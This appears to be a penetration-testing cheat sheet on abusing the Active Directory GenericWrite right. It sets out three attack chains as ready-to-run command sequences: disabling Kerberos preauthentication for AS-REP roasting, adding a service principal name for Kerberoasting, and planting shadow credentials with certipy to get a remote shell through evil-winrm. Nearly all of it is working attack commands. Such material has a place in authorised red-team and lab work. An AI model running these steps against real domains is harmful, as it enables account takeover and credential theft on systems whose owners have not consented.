---
title: "GenericWrite"
date: 2024-7-13
tags: ["GenericWrite", "active driectory", "ad", "Windows"]
---

---
### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Check target user

```powershell
Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue
```

#### 3. Add UF_DONT_REQUIRE_PREAUTH bit

```powershell
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### 4. AS-REP Roasting

```bash
# In local linux machine
impacket-GetNPUsers <DOMAIN>/<USER> -no-pass -dc-ip <DC>
```

### Abuse #2 : Kerberoasting by adding spn

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Create cred object (runas) \[optional\]

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add SPN

```powershell
# Add spn (e.g. MSSQL)
setspn -a MSSQLSvc/example.com:1433 <DOMAIN>\<TARGET_USER>
```

```powershell
# Check
Get-DomainUser <TARGET_USER> | Select serviceprincipalname
```

#### 4. Get SPN

```powershell
Get-DomainSPNTicket -SPN "MSSQLSvc/example.com:1433" -Credential $Cred
```

### Abuse #3: Add shadow credentials (From Linux)

```bash
# Request a ticket
kinit <USER>
```

```bash
# Import ticket
export KRB5CCNAME=/tmp/krb5cc_1000
```

```bash
# Pre-check (Optional)
certipy-ad find -username <USER>@<DOMAIN> -k -target <TARGET_DOMAIN>
```

```bash
# Add shadow credentials
certipy-ad shadow auto -username <USER>@<DOMAIN> -account <TARGET_USER> -k -target <TARGET_DOMAIN>
```

```bash
# Remote with kerberos
KRB5CCNAME=./<TARGET_USER>.ccache evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

<br>